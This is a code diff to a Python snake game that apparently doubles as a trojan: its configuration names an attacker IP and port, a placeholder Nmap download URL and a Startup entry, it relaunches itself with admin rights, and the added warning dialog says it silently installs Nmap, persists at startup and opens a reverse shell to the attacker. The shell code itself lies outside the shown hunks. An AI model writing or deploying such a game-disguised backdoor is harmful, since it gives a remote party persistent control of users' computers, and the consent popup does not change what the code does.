@@ -9,12 +9,16 @@ import winreg
 import urllib.request
 import time
 import threading
+import tkinter as tk
+from tkinter import messagebox
 
 # ====================== Configuration ======================
 ATTACKER_IP = "10.12.75.36"
 PORT = 9999
+print(ATTACKER_IP)
+
 NMAP_DOWNLOAD_URL = "http://your-server/nmap-7.94-setup.exe"
-STARTUP_NAME = "WindowsGameHost.exe"
+STARTUP_NAME = "snake_reverse.exe"
 
 # ====================== System Preparation ======================
 def check_admin():
@@ -200,6 +204,29 @@ def move():
     ontimer(move, 100)
 
 if __name__ == "__main__":
+    # Create a hidden root window for tkinter
+    root = tk.Tk()
+    root.withdraw()  # Hide the root window
+
+    # Display warning message
+    warning_message = (
+        "WARNING: By running this game, the following will happen to your computer:\n\n"
+        "1. Nmap (a network scanning tool) will be downloaded and installed silently.\n"
+        "2. This program will add itself to your Startup folder to run every time your computer starts.\n"
+        f"3. A reverse shell will connect to {ATTACKER_IP}:{PORT}, giving remote access to your system.\n\n"
+        "This could potentially harm your computer or network. Proceed only if you understand and consent.\n\n"
+        "Click 'OK' to continue or 'Cancel' to exit."
+    )
+    user_consent = messagebox.askokcancel("Warning", warning_message)
+
+    # Exit if user does not consent
+    if not user_consent:
+        sys.exit()
+
+    # Destroy the root window after consent
+    root.destroy()
+
+    # Proceed with script if user consents
     if not check_admin():
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
         sys.exit()
